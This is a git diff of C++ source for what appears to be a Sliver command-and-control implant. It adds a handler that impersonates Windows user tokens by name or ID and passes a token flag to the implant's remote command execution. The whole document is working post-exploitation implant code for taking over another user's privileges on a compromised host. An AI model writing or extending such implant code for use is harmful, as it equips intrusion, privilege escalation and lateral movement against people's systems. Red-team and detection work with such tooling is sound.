@@ -10,6 +10,7 @@
 #include <gzip/compress.hpp>
 #include <gzip/decompress.hpp>
 #include "Token.h"
+#include "Utils.h"
 
 using namespace std;
 using namespace taskrunner;
@@ -30,7 +31,8 @@ namespace handlers {
 		{sliverpb::MsgMakeTokenReq,static_cast<handler>(makeTokenHandler)},
 		{sliverpb::MsgRevToSelfReq,static_cast<handler>(revToSelfHandler)},
 		{sliverpb::MsgExecuteWindowsReq,static_cast<handler>(executeHandler)},
-		{sliverpb::MsgExecuteReq,static_cast<handler>(executeHandler)}
+		{sliverpb::MsgExecuteReq,static_cast<handler>(executeHandler)},
+		{sliverpb::MsgImpersonateReq,static_cast<handler>(impersonateHandler)}
 
 
 	};
@@ -41,6 +43,7 @@ namespace handlers {
 	sliverpb::Envelope executeHandler(int64_t taskID, string data) {
 		sliverpb::ExecuteWindowsReq req;
 		sliverpb::Execute resp;
+
 		req.ParseFromString(data);
 		string cmd;
 		cmd.append(req.path());
@@ -48,7 +51,7 @@ namespace handlers {
 		for (auto it = req.args().begin();it != req.args().end();++it)
 			cmd.append(it->c_str());
 		try {
-			auto output = taskrunner::execute(cmd, req.output(),req.ppid());
+			auto output = taskrunner::execute(cmd, req.output(),req.ppid(),req.usetoken());
 			resp.set_stdout_pb(output);
 		}
 		catch (exception& e) {
@@ -224,6 +227,18 @@ namespace handlers {
 		for (auto it = out.begin();it != out.end();++it) {
 			resp.add_names(it->c_str());
 		}
+		return wrapResponse(taskID, resp);
+	}
+
+	sliverpb::Envelope impersonateHandler(int64_t taskID, string data) {
+		sliverpb::ImpersonateReq req;
+		req.ParseFromString(data);
+		sliverpb::Impersonate resp;
+		bool res = FALSE;
+		if (utils::is_number(req.username()))
+			res = token::Impersonate(stoi(req.username()));
+		else
+			res = token::Impersonate(req.username());
 		return wrapResponse(taskID, resp);
 	}
 }
